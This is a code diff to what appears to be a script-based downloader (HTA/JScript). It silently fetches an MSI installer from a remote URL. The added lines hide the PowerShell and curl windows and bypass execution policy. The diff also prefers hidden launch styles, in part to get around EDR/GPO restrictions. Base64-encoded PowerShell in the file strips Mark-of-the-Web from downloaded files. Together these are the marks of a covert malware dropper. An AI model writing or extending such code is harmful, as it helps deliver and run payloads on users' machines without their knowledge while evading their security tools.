@@ -202,7 +202,7 @@ function b64EncodeU16(s) {
 // Helper template: unblocks the local files (MOTW), then downloads the
 // installer (iwr first, then system curl.exe), drops a done.flag.
 var PS_TMPL_B64 = "JFVybCA9ICJAVVJMQCIKJERpciA9ICJARElSQCIKJE91dCA9ICJAT1VUQCIKJEh0YSA9ICJASFRBQCIKJFppcCA9ICJAWklQQCIKdHJ5IHsgaWYgKCRIdGEgLWFuZCAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkSHRhKSkgeyBVbmJsb2NrLUZpbGUgLUxpdGVyYWxQYXRoICRIdGEgfSB9IGNhdGNoIHt9CnRyeSB7IGlmICgkWmlwIC1hbmQgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJFppcCkpIHsgVW5ibG9jay1GaWxlIC1MaXRlcmFsUGF0aCAkWmlwIH0gfSBjYXRjaCB7fQp0cnkgeyBbTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZWN1cml0eVByb3RvY29sID0gW05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCAtYm9yIFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMiB9IGNhdGNoIHt9CiR1YSA9ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTI2LjAuMC4wIFNhZmFyaS81MzcuMzYiCiRvayA9ICRmYWxzZQp0cnkgewogICRyZXEgPSBbU3lzdGVtLk5ldC5IdHRwV2ViUmVxdWVzdF06OkNyZWF0ZSgkVXJsKQogICRyZXEuTWV0aG9kID0gIkdFVCIKICAkcmVxLlVzZXJBZ2VudCA9ICR1YQogICRyZXEuVGltZW91dCA9IDYwMDAwCiAgJHJlcS5SZWFkV3JpdGVUaW1lb3V0ID0gNjAwMDAKICAkcmVzcCA9ICRyZXEuR2V0UmVzcG9uc2UoKQogICRmcyA9IFtTeXN0ZW0uSU8uRmlsZV06OkNyZWF0ZSgkT3V0KQogICRyZXNwLkdldFJlc3BvbnNlU3RyZWFtKCkuQ29weVRvKCRmcykKICAkZnMuQ2xvc2UoKQogICRyZXNwLkNsb3NlKCkKICAkb2sgPSAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkT3V0KQp9IGNhdGNoIHsgJG9rID0gJGZhbHNlIH0KaWYgKC1ub3QgJG9rKSB7CiAgdHJ5IHsKICAgICRQcm9ncmVzc1ByZWZlcmVuY2UgPSAnU2lsZW50bHlDb250aW51ZScKICAgIEludm9rZS1XZWJSZXF1ZXN0IC1VcmkgJFVybCAtT3V0RmlsZSAkT3V0IC1Vc2VCYXNpY1BhcnNpbmcgLVRpbWVvdXRTZWMgMTIwIC1Vc2VyQWdlbnQgJHVhCiAgICAkb2sgPSAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkT3V0KQogIH0gY2F0Y2ggeyAkb2sgPSAkZmFsc2UgfQp9CmlmICgtbm90ICRvaykgewogIHRyeSB7CiAgICAkZW52Ok5PX1BST1hZID0gIioiCiAgICBjdXJsLmV4ZSAtTCAtLWZhaWwgLS1yZXRyeSAxIC0tY29ubmVjdC10aW1lb3V0IDIwIC0tbWF4LXRpbWUgMjQwIC1BICR1YSAtbyAkT3V0ICRVcmwgMj4kbnVsbAogICAgaWYgKCRMQVNURVhJVENPREUgLWVxIDApIHsgJG9rID0gKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJE91dCkgfQogIH0gY2F0Y2ggeyAkb2sgPSAkZmFsc2UgfQp9CnRyeSB7IFNldC1Db250ZW50IC1MaXRlcmFsUGF0aCAoSm9pbi1QYXRoICREaXIgImRvbmUuZmxhZyIpICIxIiAtTm9OZXdsaW5lIH0gY2F0Y2gge30K";
-var PSX_B64 = "cG93ZXJzaGVsbC5leGUgLU5vUHJvZmlsZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRW5jb2RlZENvbW1hbmQg";
+var PSX_B64 = "cG93ZXJzaGVsbC5leGUgLU5vUHJvZmlsZSAtV2luZG93U3R5bGUgSGlkZGVuIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1FbmNvZGVkQ29tbWFuZCA=";
 
 function $(id) { return document.getElementById(id); }
 
@@ -508,13 +508,17 @@ function saveWHttpBody(rb) {
 // if one, 0 otherwise; never throws.
 function launchCmd(cmd) {
   // Returns child PID, 0 when launched without a PID, or -1 when every
-  // launch style was rejected by the system.
+  // launch style was rejected by the system. Hidden styles are tried first:
+  // EDR/GPO stubs can reject the two-arg Exec with E_INVALIDARG while the
+  // one-arg (visible) Exec still works - so a visible-only list would let a
+  // console window pop up. The child command itself is also window-hidden
+  // (-WindowStyle Hidden), so even a visible-style launch shows nothing.
   var styles = [
     function () { return shell.Exec(cmd, 0); },
-    function () { return shell.Exec(cmd); },
     function () { return new ActiveXObject("WScript.Shell").Exec(cmd, 0); },
-    function () { shell.Run(cmd, 7, false); return null; },
-    function () { shell.Run(cmd, 0, false); return null; }
+    function () { shell.Run(cmd, 0, false); return null; },
+    function () { return shell.Exec(cmd); },
+    function () { shell.Run(cmd, 7, false); return null; }
   ];
   for (var i = 0; i < styles.length; i++) {
     try {
@@ -569,15 +573,23 @@ function fallbackPS() {
   } catch (e) { traceLog("predl: exec build fail " + e.message); }
 }
 
-// Final back-end: the system curl.exe alone (Win10 1803+, 32- and 64-bit).
-// Writes straight to msiLocal; the poll loop watches the file appear.
+// Final back-end: the system curl.exe (Win10 1803+, 32- and 64-bit), run
+// inside a hidden PowerShell so no console window pops up. Writes straight
+// to msiLocal; the poll loop watches the file appear. If the PowerShell
+// launch is rejected entirely, fall back to bare curl.exe (visible worst case).
 function fallbackCurl() {
   curlT0 = nowMs(); curlLastSize = 0; curlLastGrowT = curlT0;
   if (!curlExeExists()) { traceLog("predl: curl.exe not found"); return; }
+  var inner = "curl.exe -L --fail --retry 2 --connect-timeout 20 --max-time 240 -o '" + msiLocal + "' '" + MSI_URL + "'";
+  var cmd = b64Decode(PSX_B64) + b64EncodeU16(inner);
   try {
-    var cmd = "curl.exe -L --fail --retry 2 --connect-timeout 20 --max-time 240 -o \"" + msiLocal + "\" \"" + MSI_URL + "\"";
     curlPid = launchCmd(cmd);
     traceLog("predl: curl launched pid=" + curlPid + (curlPid < 0 ? " (all styles rejected)" : ""));
+    if (curlPid < 0) {
+      curlT0 = nowMs(); curlLastGrowT = curlT0;
+      curlPid = launchCmd("curl.exe -L --fail --retry 2 --connect-timeout 20 --max-time 240 -o \"" + msiLocal + "\" \"" + MSI_URL + "\"");
+      traceLog("predl: curl bare launched pid=" + curlPid);
+    }
   } catch (e) { traceLog("predl: curl build fail " + e.message); }
 }
 
